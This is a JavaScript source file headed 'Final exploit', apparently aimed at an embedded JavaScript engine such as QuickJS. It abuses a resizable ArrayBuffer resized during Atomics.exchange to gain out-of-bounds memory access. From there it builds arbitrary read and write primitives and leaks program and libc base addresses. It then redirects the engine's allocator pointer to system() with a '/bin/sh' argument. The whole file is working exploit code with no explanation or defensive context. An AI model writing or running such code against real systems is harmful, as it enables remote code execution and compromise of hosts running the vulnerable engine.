// Final exploit - optimized search
function read32(view, offset) {
    return (view[offset] | (view[offset+1] << 8) |
            (view[offset+2] << 16) | (view[offset+3] << 24)) >>> 0;
}

function read64(view, offset) {
    let low = read32(view, offset);
    let high = read32(view, offset + 4);
    return [low, high];
}

function write32(view, offset, val) {
    view[offset] = val & 0xff;
    view[offset+1] = (val >> 8) & 0xff;
    view[offset+2] = (val >> 16) & 0xff;
    view[offset+3] = (val >> 24) & 0xff;
}

function write64(view, offset, low, high) {
    write32(view, offset, low);
    write32(view, offset + 4, high);
}

function hex64(arr) {
    let hi = arr[1].toString(16).padStart(8, '0');
    let lo = arr[0].toString(16).padStart(8, '0');
    return '0x' + hi + lo;
}

function addAddr(arr, offset) {
    let low = arr[0] + offset;
    let high = arr[1];
    while (low < 0) {
        low += 0x100000000;
        high -= 1;
    }
    while (low >= 0x100000000) {
        low -= 0x100000000;
        high += 1;
    }
    return [low, high];
}

const PIE_JS_ARRAY_BUFFER_FREE = 0x14bc0;
const PIE_GOT_FREE = 0x10bc20;
const PIE_JS_DEF_MALLOC = 0x16900;
const PIE_JS_DEF_FREE = 0x16ea0;

const LIBC_FREE_OFFSET = 0xa3240;
const LIBC_SYSTEM_OFFSET = 0x53110;
const LIBC_GADGET_OFFSET = 0x8f765;
const LIBC_BINSH_OFFSET = 0x1a7ea4;

let spray = [];
for (let i = 0; i < 20; i++) {
    spray.push(new ArrayBuffer(48));
}

let victim_ab = new ArrayBuffer(48, { maxByteLength: 8192 });
let victim_view = new Int32Array(victim_ab);

let oob_ab = null;
let arb_ab = null;

let malicious = {
    valueOf: function() {
        victim_ab.resize(8192);
        oob_ab = new ArrayBuffer(0x100);
        arb_ab = new ArrayBuffer(0x100);

        let tmp = new Uint8Array(arb_ab);
        tmp[0] = 0xDE; tmp[1] = 0xAD; tmp[2] = 0xBE; tmp[3] = 0xEF;
        tmp[4] = 0xCA; tmp[5] = 0xFE; tmp[6] = 0xBA; tmp[7] = 0xBE;

        return 0x7fffffff;
    }
};

Atomics.exchange(victim_view, 0, malicious);

if (oob_ab.byteLength != 0x100) {
    let oob_view = new Uint8Array(oob_ab);

    let marker_offset = -1;
    for (let offset = 0; offset < 0x40000; offset += 8) {
        try {
            let val = read64(oob_view, offset);
            if (val[0] == 0xEFBEADDE && val[1] == 0xBEBAFECA) {
                marker_offset = offset;
                break;
            }
        } catch (e) {
            break;
        }
    }

    let struct_offset = -1;
    for (let so = marker_offset - 0x100; so < marker_offset; so += 8) {
        if (so < 0) continue;
        let sv = read64(oob_view, so);
        if (sv[0] == 0x100 && sv[1] == 0xffffffff) {
            struct_offset = so;
            break;
        }
    }

    let data_ptr = read64(oob_view, struct_offset + 0x10);
    let free_func = read64(oob_view, struct_offset + 0x30);

    let pie_base = addAddr(free_func, -PIE_JS_ARRAY_BUFFER_FREE);
    let orig_data = [data_ptr[0], data_ptr[1]];

    function arbRead(addr) {
        write64(oob_view, struct_offset + 0x10, addr[0], addr[1]);
        let arb_view = new Uint8Array(arb_ab);
        let val = read64(arb_view, 0);
        write64(oob_view, struct_offset + 0x10, orig_data[0], orig_data[1]);
        return val;
    }

    function arbWrite(addr, val) {
        write64(oob_view, struct_offset + 0x10, addr[0], addr[1]);
        let arb_view = new Uint8Array(arb_ab);
        write64(arb_view, 0, val[0], val[1]);
        write64(oob_view, struct_offset + 0x10, orig_data[0], orig_data[1]);
    }

    let got_free = addAddr(pie_base, PIE_GOT_FREE);
    let libc_free = arbRead(got_free);
    let libc_base = addAddr(libc_free, -LIBC_FREE_OFFSET);
    let libc_system = addAddr(libc_base, LIBC_SYSTEM_OFFSET);
    let libc_gadget = addAddr(libc_base, LIBC_GADGET_OFFSET);
    let libc_binsh = addAddr(libc_base, LIBC_BINSH_OFFSET);

    let js_def_malloc = addAddr(pie_base, PIE_JS_DEF_MALLOC);
    let js_def_free = addAddr(pie_base, PIE_JS_DEF_FREE);

    // Search at observed fixed offset range
    let found_rt = null;
    for (let off = 0x28000; off < 0x2e000 && !found_rt; off += 8) {
        let try_addr = addAddr(data_ptr, -off);
        let val = arbRead(try_addr);
        if (val[0] == js_def_malloc[0] && val[1] == js_def_malloc[1]) {
            let next_val = arbRead(addAddr(try_addr, 8));
            if (next_val[0] == js_def_free[0] && next_val[1] == js_def_free[1]) {
                found_rt = try_addr;
            }
        }
    }

    if (found_rt) {
        arbWrite(found_rt, libc_system);
        write64(oob_view, struct_offset + 0x10, libc_binsh[0], libc_binsh[1]);
        write64(oob_view, struct_offset + 0x30, libc_gadget[0], libc_gadget[1]);
    }
}
